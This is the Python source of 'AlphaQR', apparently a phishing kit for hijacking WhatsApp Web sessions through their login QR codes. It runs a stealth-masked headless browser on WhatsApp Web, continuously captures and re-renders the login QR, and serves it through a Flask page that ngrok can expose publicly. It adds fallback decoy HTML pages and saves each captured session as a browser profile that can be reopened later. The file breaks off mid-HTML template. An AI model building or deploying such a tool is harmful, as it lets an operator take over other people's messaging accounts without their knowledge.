import sys
import os
import subprocess
import platform
import time
import threading
import shutil
import importlib.util
import webbrowser
import atexit

# ==========================================
# 1. BOOTSTRAP & VENV HANDLING
# ==========================================

VENV_DIR = os.path.join(os.getcwd(), "venv")

def get_python_bin():
    """Get the path to the virtual environment's python binary"""
    if platform.system() == "Windows":
        return os.path.join(VENV_DIR, "Scripts", "python.exe")
    return os.path.join(VENV_DIR, "bin", "python")

def is_venv():
    """Check if the current process is running inside a virtual environment"""
    return (sys.prefix != sys.base_prefix) or os.path.exists(os.path.join(sys.prefix, 'pyvenv.cfg'))

def show_loading_bar(message, total_steps=20, delay=0.05):
    """Show a simple loading bar"""
    YELLOW = "\033[93m"
    RESET = "\033[0m"
    bar_width = 30
    for i in range(total_steps + 1):
        percent = i / total_steps
        filled_width = int(bar_width * percent)
        bar = '█' * filled_width + '░' * (bar_width - filled_width)
        sys.stdout.write(f'\r{YELLOW}{message} [{bar}] {int(percent * 100)}%{RESET}')
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write('\n')
    sys.stdout.flush()

def ensure_playwright_chromium():
    """Checks if Playwright Chromium is installed, and installs it if not."""
    try:
        import importlib.util
        # Try to import playwright - if not installed, wait until it is installed in bootstrap
        if not importlib.util.find_spec("playwright"):
            return
            
        import os
        import subprocess
        import sys
        
        # Check using playwright API
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                exe_path = p.chromium.executable_path
                if os.path.exists(exe_path):
                    return  # Chromium is already installed, skip download!
        except Exception:
            # If importing/checking fails, we will try to install it
            pass

        print("\033[93mPlaywright Chromium browser not found. Installing chromium browser...\033[0m")
        # Show a loading indicator
        show_loading_bar("Downloading Chromium (may take a minute)", total_steps=20, delay=0.05)
        # Run the install command
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
        print("\033[92m✓ Playwright Chromium browser installed successfully.\033[0m")
    except Exception as e:
        print(f"\033[91mFailed to install Playwright Chromium: {e}\033[0m")
        print("\033[93mYou might need to run manually: python -m playwright install chromium\033[0m")

def bootstrap():
    """Ensure environment is ready. Venv for Linux, direct for Windows."""
    required_modules = {
        'flask': 'flask',
        'flask_socketio': 'flask-socketio',
        'PIL': 'pillow',
        'pyzbar': 'pyzbar',
        'cv2': 'opencv-python',
        'qrcode': 'qrcode',
        'numpy': 'numpy',
        'colorama': 'colorama',
        'pyngrok': 'pyngrok',
        'requests': 'requests',
        'playwright': 'playwright',
        'zxingcpp': 'zxing-cpp'
    }
    if platform.system() == "Windows":
        required_modules['readline'] = 'pyreadline3'

    # --- LINUX VENV LOGIC ---
    if platform.system() != "Windows":
        if not is_venv():
            print("\033[93mLinux detected: Setting up environment...\033[0m")
            
            # Install Tesseract binary on Linux if missing
            if not shutil.which("tesseract"):
                print("\033[93mTesseract engine not found. Installing via apt...\033[0m")
                try:
                    # Run apt update and install
                    subprocess.run(["sudo", "apt", "update"], check=True)
                    subprocess.run(["sudo", "apt", "install", "-y", "tesseract-ocr", "libtesseract-dev"], check=True)
                    print("\033[92m✓ Tesseract engine installed successfully.\033[0m")
                except Exception as e:
                    print(f"\033[91mFailed to install Tesseract binary: {e}\033[0m")
                    print("\033[93mPlease install it manually: sudo apt install tesseract-ocr libtesseract-dev -y\033[0m")

            if not os.path.exists(VENV_DIR):
                subprocess.run([sys.executable, "-m", "venv", "venv"], check=True)
            
            python_bin = get_python_bin()
            
            # Check and install inside venv
            for mod, pkg in required_modules.items():
                check = subprocess.run([python_bin, "-c", f"import {mod}"], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if check.returncode != 0:
                    show_loading_bar(f"Installing {pkg} in venv")
                    subprocess.run([python_bin, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print("\033[92m✓ Venv ready. Restarting AlphaQR inside venv...\033[0m")
            os.execv(python_bin, [python_bin] + sys.argv)
            sys.exit(0)

    # --- WINDOWS / IN-VENV LOGIC ---
    print("\033[93mChecking dependencies...\033[0m")
    for mod, pkg in required_modules.items():
        installed = False
        try:
            if importlib.util.find_spec(mod):
                installed = True
        except Exception:
            pass
        if not installed:
            try:
                __import__(mod)
                installed = True
            except ImportError:
                installed = False
                
        if not installed:
            show_loading_bar(f"Installing {pkg}")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                print(f"\033[91mFailed to install {pkg}: {e}\033[0m")

    # Ensure Playwright Chromium browser is installed
    ensure_playwright_chromium()

# Run bootstrap
if __name__ == "__main__":
    bootstrap()

# ==========================================
# 2. IMPORTS
# ==========================================
try:
    from flask import Flask, request, jsonify, render_template_string, send_from_directory, redirect
    from flask_socketio import SocketIO, emit
    from werkzeug.utils import secure_filename
    import base64
    import datetime
    from PIL import Image
    from io import BytesIO
    import qrcode
    import logging
    import re
    import numpy as np
    from colorama import Fore, Style, init
    from pyngrok import ngrok, conf
    import requests
    from playwright.async_api import async_playwright
    import asyncio
    import zxingcpp
except ImportError as e:
    print(f"Critical Error: Failed to import dependencies. {e}")
    sys.exit(1)

# Setup autocomplete for CLI loop
try:
    import readline
    import glob
    
    def cli_completer(text, state):
        try:
            buffer = readline.get_line_buffer()
            parts = buffer.split()
            
            # 1. Complete commands (first word)
            if not buffer or (len(parts) == 1 and not buffer.endswith(' ')):
                options = ["link", "server", "open", "restart", "exit", "help"]
                matches = [cmd for cmd in options if cmd.startswith(text)]
                if state < len(matches):
                    return matches[state]
                return None
                
            # 2. Complete command arguments
            cmd = parts[0].lower()
            
            if cmd == "link":
                # Link completes html files in current directory or uploads
                html_files = []
                try:
                    html_files += [f for f in os.listdir('.') if f.endswith('.html')]
                except:
                    pass
                try:
                    if os.path.exists('uploads'):
                        html_files += [os.path.join('uploads', f) for f in os.listdir('uploads') if f.endswith('.html')]
                except:
                    pass
                
                # Find current typed argument to match
                arg = parts[1] if len(parts) > 1 else ""
                matches = [f for f in html_files if f.lower().startswith(arg.lower())]
                if state < len(matches):
                    return matches[state]
                return None
                
            elif cmd == "open":
                # Suggest existing profile directories
                profiles = []
                try:
                    if os.path.exists('browser_profile'):
                        profiles = [name for name in os.listdir('browser_profile') 
                                    if os.path.isdir(os.path.join('browser_profile', name)) and name.isdigit()]
                except:
                    pass
                arg = parts[1] if len(parts) > 1 else ""
                matches = [p for p in profiles if p.startswith(arg)]
                if state < len(matches):
                    return matches[state]
                return None
                
            else:
                # 3. General file path completion for system commands (like ls, cd, etc.)
                # Complete matching files/directories
                search_pattern = text + '*'
                matches = glob.glob(search_pattern)
                matches = [m + '/' if os.path.isdir(m) else m for m in matches]
                if state < len(matches):
                    return matches[state]
                return None
                
        except Exception:
            return None

    readline.set_completer(cli_completer)
    readline.set_completer_delims(' \t\n')
    readline.parse_and_bind("tab: complete")
except Exception as readline_err:
    sys.stderr.write(f"Warning: Autocomplete setup failed: {readline_err}\n")

class DecodedObject:
    def __init__(self, data):
        self.data = data

def decode(image):
    """Decode QR code from image. Tries zxingcpp, pyzbar, and opencv in order."""
    # 1. Try zxingcpp (most robust & pre-compiled, works on Win/Linux without external dependencies)
    try:
        results = zxingcpp.read_barcodes(image)
        if results:
            return [DecodedObject(r.text.encode('utf-8')) for r in results]
    except Exception:
        pass

    # 2. Try pyzbar
    try:
        from pyzbar.pyzbar import decode as pyzbar_decode
        results = pyzbar_decode(image)
        if results:
            return [DecodedObject(r.data) for r in results]
    except Exception:
        pass

    # 3. Try OpenCV as final fallback
    try:
        import cv2
        if hasattr(image, 'convert'):
            img_np = np.array(image)
        elif isinstance(image, np.ndarray):
            img_np = image
        else:
            img_np = np.array(image)

        if len(img_np.shape) == 3:
            if img_np.shape[2] == 3:
                gray = cv2.cvtColor(img_np, cv2.COLOR_BGR2GRAY)
            elif img_np.shape[2] == 4:
                gray = cv2.cvtColor(img_np, cv2.COLOR_BGRA2GRAY)
            else:
                gray = img_np
        else:
            gray = img_np

        decoded_objects = []

        # Try OpenCV QRCodeDetector
        try:
            qr_detector = cv2.QRCodeDetector()
            if hasattr(qr_detector, 'detectAndDecodeMulti'):
                success, decoded_info, points, straight_qrcode = qr_detector.detectAndDecodeMulti(gray)
                if success and decoded_info:
                    for info in decoded_info:
                        if info:
                            decoded_objects.append(DecodedObject(info.encode('utf-8')))
            else:
                retval, decoded_info, points, straight_qrcode = qr_detector.detectAndDecode(gray)
                if retval and decoded_info:
                    decoded_objects.append(DecodedObject(decoded_info.encode('utf-8')))
        except:
            pass

        # Try OpenCV BarcodeDetector
        try:
            barcode_detector = cv2.barcode.BarcodeDetector()
            if hasattr(barcode_detector, 'detectAndDecodeMulti'):
                success, decoded_info, points, straight_barcode = barcode_detector.detectAndDecodeMulti(gray)
                if success and decoded_info:
                    for info in decoded_info:
                        if info:
                            decoded_objects.append(DecodedObject(info.encode('utf-8')))
            else:
                retval, decoded_info, points, straight_barcode = barcode_detector.detectAndDecode(gray)
                if retval and decoded_info:
                    decoded_objects.append(DecodedObject(decoded_info.encode('utf-8')))
        except:
            pass

        return decoded_objects
    except Exception:
        pass

    return []

# Initialize Colorama
init(autoreset=True)

# ==========================================
# 3. GLOBAL CONFIG & FLASK SETUP
# ==========================================

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Configure logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.getLogger('socketio').setLevel(logging.ERROR)
logging.getLogger('engineio').setLevel(logging.ERROR)

# Create a logger for application errors
app_logger = logging.getLogger('AlphaQR')
app_logger.setLevel(logging.ERROR)
handler = logging.StreamHandler(sys.stderr)  # Use stderr, not stdout
handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
app_logger.addHandler(handler)

# Global State
current_qr_link = None
last_update_time = None
qr_candidates = []
config_string = ""
fallback_active = False
element_fallback_active = False
keyword_fallback_active = False
selected_fallback_file = None
fallback_url = ""
ocr_words = set()
keyword_status = "GREY"
dom_login_active = False

CURRENT_URL = "http://localhost:5000"
NGROK_TUNNEL = None

UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ==========================================
# 4. BUSINESS LOGIC (Original Code)
# ==========================================

def get_uploaded_files():
    try:
        return [f for f in os.listdir(UPLOAD_FOLDER) if f.endswith('.html')]
    except Exception:
        return []

style_options = {
    "dotStyle": "square", "dotColor": "#000000", "eyeStyle": "square",
    "innerEyeStyle": "square", "eyeColor": "#000000", "eyeOuterColor": "#000000",
    "eyeInnerColor": "#000000", "colorMode": "single", "gradientType": "linear",
    "dotPrimary": "#000000", "dotSecondary": "#1f2937", "backgroundStyle": "white",
    "backgroundColor": "#ffffff", "logoUrl": "", "logoSize": 0.35,
    "logoMargin": 8, "hideBgDots": False
}

DEMO_LINK = "https://example.com/demo"
PROFILE_DIR = os.path.join(os.getcwd(), "browser_profile")

class BrowserManager:
    def __init__(self):
        self.playwright = None
        self.context = None
        self.page = None
        self.browser_open = False
        self.extracted_text = ""
        self.qr_results = []
        self.original_screenshot_base64 = ""
        self.recreated_qr_base64 = ""
        self.current_url = ""
        self.loop = None
        self.thread = None
        self.current_profile_num = None
        self.current_profile_dir = None
        
    def start_loop(self):
        if self.thread and self.thread.is_alive():
            return
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def run_async(self, coro):
        return asyncio.run_coroutine_threadsafe(coro, self.loop)

    async def _setup_browser(self, url):
        try:
            if not url.startswith("http"):
                url = "https://" + url
            self.current_url = url

            self.playwright = await async_playwright().start()
            
            # Launch persistent context with stealth flags
            self.context = await self.playwright.chromium.launch_persistent_context(
                user_data_dir=self.current_profile_dir,
                headless=True,
                viewport={"width": 1400, "height": 900},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-infobars",
                    "--window-position=0,0",
                    "--ignore-certificate-errors",
                ],
                ignore_https_errors=True
            )

            # Stealth: Add init script to mask automation
            await self.context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
            """)

            if self.context.pages:
                self.page = self.context.pages[0]
            else:
                self.page = await self.context.new_page()

            self.page.set_default_timeout(60000)
            
            await self.page.goto(url, wait_until="domcontentloaded")
            self.browser_open = True
            
            # Start background extraction task with high frequency
            asyncio.run_coroutine_threadsafe(self._extraction_loop(), self.loop)
                            
        except Exception as e:
            app_logger.error(f"Failed to start browser: {e}")
            await self._cleanup()

    async def _extraction_loop(self):
        while self.browser_open:
            try:
                start_time = time.time()
                await self._extract_data()
                elapsed = time.time() - start_time
                wait_time = max(0.1, 0.5 - elapsed)
                await asyncio.sleep(wait_time)
            except Exception as e:
                app_logger.error(f"Extraction loop error: {e}")
                await asyncio.sleep(1)

    async def _extract_data(self):
        global current_qr_link, last_update_time, qr_candidates
        global fallback_active, keyword_fallback_active, element_fallback_active
        global ocr_words, keyword_status, selected_fallback_file, fallback_url
        
        if not self.page:
            return

        try:
            # 1. Take a screenshot of the headless browser page (viewport)
            screenshot_bytes = None
            try:
                screenshot_bytes = await self.page.screenshot(full_page=False, timeout=5000)
            except Exception as e:
                pass

            # 2. Decode QR code from screenshot
            decoded_links = []
            if screenshot_bytes:
                self.original_screenshot_base64 = base64.b64encode(screenshot_bytes).decode()
                try:
                    img = Image.open(BytesIO(screenshot_bytes))
                    # Call our decode function
                    result = decode(img)
                    if result:
                        decoded_links = list(set([r.data.decode('utf-8') for r in result]))
                except Exception as e:
                    pass

            # 4. Continuous DOM text extraction (Shadow DOM support)
            dom_text = ""
            try:
                dom_text = await self.page.evaluate("""
                    () => {
                        function isVisible(el) {
                            if (!el) return false;
                            const style = window.getComputedStyle(el);
                            return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
                        }

                        function extract(node) {
                            let texts = [];
                            if (node.nodeType === Node.TEXT_NODE) {
                                const text = node.textContent.trim();
                                if (text.length > 1 && text.length < 1000) {
                                    texts.push(text);
                                }
                            } else if (node.nodeType === Node.ELEMENT_NODE) {
                                const tag = node.tagName;
                                if (['SCRIPT', 'STYLE', 'NOSCRIPT', 'SVG', 'PATH'].includes(tag)) return texts;
                                if (!isVisible(node)) return texts;

                                if (node.shadowRoot) {
                                    texts.push(...extract(node.shadowRoot));
                                }

                                if (node.tagName === 'IFRAME') {
                                    try {
                                        if (node.contentDocument && node.contentDocument.body) {
                                            texts.push(...extract(node.contentDocument.body));
                                        }
                                    } catch (e) {}
                                }

                                for (const child of node.childNodes) {
                                    texts.push(...extract(child));
                                }
                            }
                            return texts;
                        }
                        
                        const rawTexts = extract(document.body);
                        return [...new Set(rawTexts)].join('\\n');
                    }
                """)
                self.extracted_text = dom_text
            except Exception as e:
                pass

            # 5. Extract OCR text - Removed as requested
            combined_text = dom_text.lower()

            # 6. Keyword Presence & Fallback Logic
            string_found = False
            if config_string and config_string.strip():
                if config_string.lower() in combined_text:
                    string_found = True
                    keyword_status = "GREEN"
                else:
                    string_found = False
                    keyword_status = "RED"
            else:
                keyword_status = "GREY"
                string_found = True

            should_keyword_fallback = False
            if config_string and config_string.strip() and not string_found:
                 should_keyword_fallback = True
            
            if should_keyword_fallback != keyword_fallback_active:
                keyword_fallback_active = should_keyword_fallback
                
            effective_fallback = element_fallback_active or keyword_fallback_active
            
            if effective_fallback and not fallback_active:
                fallback_active = True
                if dom_login_active:
                    socketio.emit('fallback_on', {'type': 'dom'})
                elif selected_fallback_file:
                    filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
                    if os.path.exists(filepath):
                        socketio.emit('fallback_on', {'file': selected_fallback_file, 'type': 'file'})
                elif fallback_url and fallback_url.strip():
                     socketio.emit('fallback_on', {'url': fallback_url, 'type': 'url'})
                        
            elif not effective_fallback and fallback_active:
                 fallback_active = False
                 socketio.emit('fallback_off')

            # 7. Update QR Candidates
            num_qrs = len(decoded_links)
            if num_qrs == 1:
                link = decoded_links[0]
                if link != DEMO_LINK and link != current_qr_link:
                    current_qr_link = link
                    last_update_time = datetime.datetime.now().isoformat()
                qr_candidates = decoded_links
            else:
                qr_candidates = decoded_links

            self.qr_results = decoded_links
            if decoded_links:
                self._generate_qr_image(decoded_links[0])

            # Refresh browser if QR disappeared but keyword exists (strict rule)
            if num_qrs == 0 and string_found and (time.time() - getattr(self, 'last_reload_time', 0) > 15):
                self.last_reload_time = time.time()
                try:
                    app_logger.info("QR code disappeared but keyword exists. Reloading page...")
                    await self.page.reload(wait_until="domcontentloaded")
                except Exception as reload_err:
                    pass

        except Exception as e:
            app_logger.error(f"Error in _extract_data: {e}")

    def _generate_qr_image(self, data):
        try:
            qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=2)
            qr.add_data(data)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            self.recreated_qr_base64 = base64.b64encode(buffered.getvalue()).decode()
        except Exception as e:
            app_logger.error(f"Failed to generate QR image: {e}")

    async def _cleanup(self):
        self.browser_open = False
        try:
            if self.context:
                await self.context.close()
            if self.playwright:
                await self.playwright.stop()
        except Exception as e:
            app_logger.error(f"Cleanup error: {e}")
        finally:
            self.playwright = None
            self.context = None
            self.page = None
            self.qr_results = []
            self.original_screenshot_base64 = ""
            self.recreated_qr_base64 = ""

    def start(self, url):
        if self.browser_open:
            return
            
        # Determine next profile folder number
        if not os.path.exists(PROFILE_DIR):
            os.makedirs(PROFILE_DIR, exist_ok=True)
            
        existing_profiles = []
        for name in os.listdir(PROFILE_DIR):
            if os.path.isdir(os.path.join(PROFILE_DIR, name)) and name.isdigit():
                existing_profiles.append(int(name))
                
        next_num = max(existing_profiles) + 1 if existing_profiles else 1
        self.current_profile_num = next_num
        self.current_profile_dir = os.path.join(PROFILE_DIR, str(next_num))
        os.makedirs(self.current_profile_dir, exist_ok=True)
        
        self.browser_open = True
        self.run_async(self._setup_browser(url))

    def stop(self):
        self.run_async(self._cleanup())

    def get_state(self):
        return {
            "browser_open": self.browser_open,
            "current_url": self.current_url,
            "extracted_text": self.extracted_text,
            "qr_results": self.qr_results,
            "original_screenshot_base64": self.original_screenshot_base64,
            "recreated_qr_base64": self.recreated_qr_base64,
            "current_profile_num": self.current_profile_num
        }

def open_profile_visible(profile_num):
    profile_path = os.path.join(PROFILE_DIR, str(profile_num))
    if not os.path.exists(profile_path):
        print(f"{Fore.RED}Profile {profile_num} does not exist at {profile_path}{Style.RESET_ALL}")
        return
        
    print(f"{Fore.GREEN}Opening Profile {profile_num} in visible mode...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Close the browser window to return control to CLI.{Style.RESET_ALL}")
    
    def run():
        import asyncio
        from playwright.async_api import async_playwright
        
        async def _launch():
            try:
                async with async_playwright() as p:
                    context = await p.chromium.launch_persistent_context(
                        user_data_dir=profile_path,
                        headless=False,
                        viewport={"width": 1200, "height": 800},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                        args=[
                            "--disable-blink-features=AutomationControlled",
                            "--no-sandbox",
                            "--disable-setuid-sandbox",
                            "--disable-infobars",
                            "--ignore-certificate-errors",
                        ],
                        ignore_https_errors=True
                    )
                    page = context.pages[0] if context.pages else await context.new_page()
                    await page.goto("https://web.whatsapp.com")
                    
                    closed = asyncio.Event()
                    context.on("close", lambda ctx: closed.set())
                    page.on("close", lambda p: closed.set())
                    await closed.wait()
                    print(f"{Fore.GREEN}Profile {profile_num} browser window closed.{Style.RESET_ALL}")
            except Exception as launch_err:
                print(f"{Fore.RED}Failed to open browser: {launch_err}{Style.RESET_ALL}")
                
        asyncio.run(_launch())

    t = threading.Thread(target=run, daemon=True)
    t.start()

browser_manager = BrowserManager()
browser_manager.start_loop()

@atexit.register
def cleanup_browser():
    try:
        browser_manager.stop()
    except Exception:
        pass

# (Include HTML_TEMPLATE - compacted for brevity but fully functional)
# Using the existing template logic, but reading it from a variable or file is better.
# Since I am overwriting the file, I must include the HTML_TEMPLATE variable content.
# I will copy the HTML_TEMPLATE content from the previous Read.

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>AlphaQr</title>
<script src="https://unpkg.com/qr-code-styling/lib/qr-code-styling.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
<style>
:root{
  --bg:#e8f4f8; --panel:#ffffff; --border:#b0c4de; --text:#2c3e50; --muted:#708090;
  --blue:#87ceeb; --blue-200:#b0e0e6; --gray:#708090; --black:#000000; --white:#ffffff;
  --red:#ff6b6b; --green:#51cf66;
}
body{ font-family:"Segoe UI", system-ui, -apple-system, Arial, sans-serif; margin:0; padding:0; background:linear-gradient(135deg,#e8f4f8,#ffffff); color:var(--text); }
.wrapper{ display:grid; grid-template-columns: 1fr 1fr; gap:24px; padding:28px; align-items:start; }
.sidebar{ background:var(--panel); border:1px solid var(--border); border-radius:18px; padding:24px; box-shadow:0 16px 48px rgba(112,128,144,0.15); overflow-y:auto; }
.sidebar h2{ margin:0 0 10px 0; font-size:22px; color:var(--gray); }
.section-title { font-size:16px; font-weight:700; margin-top:24px; margin-bottom:8px; border-bottom:1px solid var(--border); padding-bottom:4px; color:var(--text); }
label{ font-weight:600; margin-top:12px; display:block; color:var(--gray); }
input, select, textarea{ width:100%; padding:10px; margin-top:6px; border:1px solid var(--border); border-radius:10px; background:#fff; color:var(--text); box-sizing: border-box; }
input:focus, select:focus, textarea:focus{ border-color:var(--blue); box-shadow:0 0 0 3px var(--blue-200); outline:none; }
.row{ display:grid; grid-template-columns: 1fr 1fr; gap:12px; }
.button{ width:100%; padding:12px; margin-top:18px; border:none; border-radius:10px; background:var(--blue); color:white; font-size:15px; cursor:pointer; }
.button:hover{ filter:brightness(1.05); }
.button.red { background: var(--red); }
.button.green { background: var(--green); }
.button.small { padding: 6px 12px; font-size: 13px; margin-top: 5px; width: auto; }
.note{ margin-top:10px; font-size:12px; color:var(--muted); }
.preview{ display:flex; align-items:center; justify-content:center; background:linear-gradient(135deg,#e8f4f8,#f0f8ff); border:1px solid var(--border); border-radius:18px; box-shadow:inset 0 0 22px rgba(112,128,144,0.1); }
#qrContainer{ padding:0; background:#ffffff; border:1px solid var(--border); border-radius:16px; box-shadow:0 10px 28px rgba(112,128,144,0.15); display:inline-block; }
#qrContainer canvas{ display:block; }
input[type="color"]{ width:60px; height:60px; padding:5px; border:2px solid var(--border); border-radius:8px; cursor:pointer; background:none; flex-shrink:0; }
input[type="color"]::-webkit-color-swatch-wrapper{ padding:0; }
input[type="color"]::-webkit-color-swatch{ border:2px solid var(--border); border-radius:6px; width:100%; height:100%; }
.color-row{ display:flex; align-items:center; gap:12px; margin-top:12px; }
.color-row label{ margin:0; flex:1; min-width:120px; }
.color-row input[type="color"]{ margin:0; }
.nav{ position:sticky; top:0; z-index:10; background:var(--panel); border-bottom:1px solid var(--border); box-shadow:0 8px 24px rgba(112,128,144,0.12); }
.nav-inner{ display:flex; align-items:center; justify-content:space-between; padding:14px 28px; }
.brand{ font-weight:700; font-size:18px; color:var(--gray); letter-spacing:0.3px; }
.menu{ display:flex; align-items:center; gap:10px; }
.menu a{ text-decoration:none; color:var(--text); padding:8px 12px; border-radius:10px; border:1px solid transparent; }
.menu a:hover{ background:var(--blue-200); border-color:var(--border); }
.tabs{ display:flex; gap:10px; padding:12px 28px 0; }
.tab-btn{ appearance:none; border:1px solid var(--border); background:var(--panel); color:var(--text); font-weight:600; padding:8px 14px; border-radius:10px; cursor:pointer; }
.tab-btn.active{ background:var(--blue-200); border-color:var(--blue); }
.about{ margin:0 28px 28px; background:var(--panel); border:1px solid var(--border); border-radius:18px; box-shadow:0 16px 48px rgba(112,128,144,0.12); padding:24px; }
.about h2{ margin:0 0 8px 0; font-size:22px; color:var(--gray); }
.about p{ margin:0; color:var(--text); line-height:1.6; }
.about-section{ margin:0 28px 28px; background:var(--panel); border:1px solid var(--border); border-radius:18px; box-shadow:0 16px 48px rgba(112,128,144,0.12); padding:24px; }
.about-header h2{ margin:0 0 12px 0; font-size:22px; color:var(--gray); }
.team-container{ display:grid; grid-template-columns: repeat(auto-fit,minmax(280px,1fr)); gap:16px; }
.team-member{ background:#fff; border:1px solid var(--border); border-radius:14px; padding:16px; box-shadow:0 8px 24px rgba(112,128,144,0.1); }
.team-member:hover{ box-shadow:0 12px 32px rgba(112,128,144,0.18); }
.member-name{ font-weight:700; font-size:16px; color:var(--text); }
.member-role{ font-size:13px; color:var(--muted); margin-top:4px; }
.member-bio{ font-size:14px; color:var(--text); line-height:1.6; margin-top:10px; }
.social-links{ display:flex; gap:10px; margin-top:12px; }
.social-link{ width:36px; height:36px; display:flex; align-items:center; justify-content:center; border:1px solid var(--border); border-radius:10px; color:var(--text); text-decoration:none; background:var(--panel); }
.social-link:hover{ background:var(--blue-200); border-color:var(--blue); }
.file-item { display:flex; align-items:center; justify-content:space-between; padding:8px; border:1px solid var(--border); margin-top:5px; border-radius:8px; background: #fafafa; }
.file-item.active { border-color: var(--green); background: #e8f8e8; box-shadow: 0 0 0 2px rgba(81, 207, 102, 0.3); }
.file-item .file-name { flex:1; font-size:14px; color:var(--text); word-break: break-all; }
.file-actions { display:flex; gap:5px; }
.upload-status { margin-top:10px; padding:10px; border-radius:8px; font-size:14px; display:none; }
.upload-status.success { display:block; background:#e8f8e8; border:1px solid var(--green); color:#2d7a2d; }
.upload-status.error { display:block; background:#ffe8e8; border:1px solid var(--red); color:#7a2d2d; }
.file-input-wrapper { position:relative; margin-top:10px; }
.file-input-wrapper input[type="file"] { display:block; width:100%; padding:12px; border:2px dashed var(--border); border-radius:10px; background:#fafafa; cursor:pointer; }
.file-input-wrapper input[type="file"]:hover { border-color:var(--blue); background:#f0f8ff; }
@media (min-width: 901px){
  .sidebar{ position: sticky; top: 92px; height: calc(100vh - 120px); overflow-y:auto; }
  .preview{ position: sticky; top: 92px; height: calc(100vh - 120px); }
}
@media (max-width: 900px){ .wrapper{ grid-template-columns: 1fr; } .menu{ gap:6px; } }
</style>
</head>
<body>
<nav class="nav">
  <div class="nav-inner">
    <div class="brand">Alpha QR</div>
    <div class="tabs">
      <button class="tab-btn active" id="navHome">Home</button>
      <button class="tab-btn" id="navAbout">About us</button>
    </div>
  </div>
</nav>
<div class="wrapper" id="designer">
  <div class="sidebar">
    <h2>QR Designer</h2>
    
    <div id="qrSelectionContainer" style="display:none;">
      <label>Select QR Code</label>
      <select id="qrCandidateSelect"></select>
    </div>

    <label>Text / URL</label>
    <input id="qrText" placeholder="Enter URL">

    <div class="section-title">Headless Browser QR Extractor</div>
    <div style="background: #fcfcfc; border: 1px solid #ddd; padding: 12px; border-radius: 12px; margin-bottom: 12px;">
      <label style="margin-top:0; font-size:14px; font-weight:600;">Browser Target URL</label>
      <input type="text" id="browserUrlInput" placeholder="https://web.whatsapp.com" value="https://web.whatsapp.com">
      <div style="display: flex; gap: 8px; margin-top: 8px;">
        <button id="startBrowserBtn" class="button small green" style="flex:1; margin-top:0;" onclick="startBrowserSession()">Start Session</button>
        <button id="stopBrowserBtn" class="button small red" style="flex:1; margin-top:0;" onclick="stopBrowserSession()">Stop Session</button>
      </div>
      <div id="browserStatusArea" style="margin-top: 10px; font-size: 13px; font-weight: bold; display: flex; align-items: center; gap: 6px;">
        <div id="browserIndicator" style="width: 8px; height: 8px; border-radius: 50%; background: #ccc;"></div>
        <span id="browserStatusText">Browser Closed</span>
      </div>
      <details style="margin-top:10px; font-size:12px; cursor:pointer;">
        <summary>View Live Browser Details</summary>
        <div style="margin-top:8px; border:1px solid #eee; padding:8px; border-radius:8px; background:#f9f9f9; max-height:200px; overflow-y:auto;">
          <strong>Live Text:</strong>
          <pre id="browserExtractedText" style="white-space: pre-wrap; font-size:11px; margin:5px 0 0 0; color:#555;">No data extracted yet.</pre>
        </div>
      </details>
    </div>
    
    <div class="section-title">Style</div>

    <div class="color-row">
      <label>Dot Style</label>
      <input type="color" id="dotPrimary" value="#000000">
      <select id="dotStyle" style="flex:1; margin:0;">
      <option value="square">Square</option>
      <option value="dots">Dots</option>
      <option value="rounded">Rounded</option>
      <option value="extra-rounded">Extra Rounded</option>
      <option value="classy">Classy</option>
      <option value="classy-rounded">Classy Rounded</option>
      </select>
    </div>
    
    <div class="color-row">
      <label>Inner Eye Style</label>
      <input type="color" id="eyeInnerColor" value="#000000">
      <select id="innerEyeStyle" style="flex:1; margin:0;">
      <option value="square">Square</option>
      <option value="dot">Dot</option>
      </select>
    </div>
    
    <div class="color-row">
      <label>Outer Eye Style</label>
      <input type="color" id="eyeOuterColor" value="#000000">
      <select id="eyeStyle" style="flex:1; margin:0;">
      <option value="square">Square</option>
      <option value="circle">Circle</option>
      </select>
    </div>
    
    <label>Color Mode</label>
    <select id="colorMode">
      <option value="single">Single</option>
      <option value="linear">Linear Gradient</option>
    </select>
    
    <label>Gradient Type</label>
    <select id="gradientType">
      <option value="linear">Linear</option>
      <option value="radial">Radial</option>
    </select>
    
    <div class="row">
      <div>
        <label>Primary Color</label>
        <input type="color" id="dotPrimary2" value="#000000">
      </div>
      <div>
        <label>Secondary Color</label>
        <input type="color" id="dotSecondary" value="#1f2937">
      </div>
    </div>
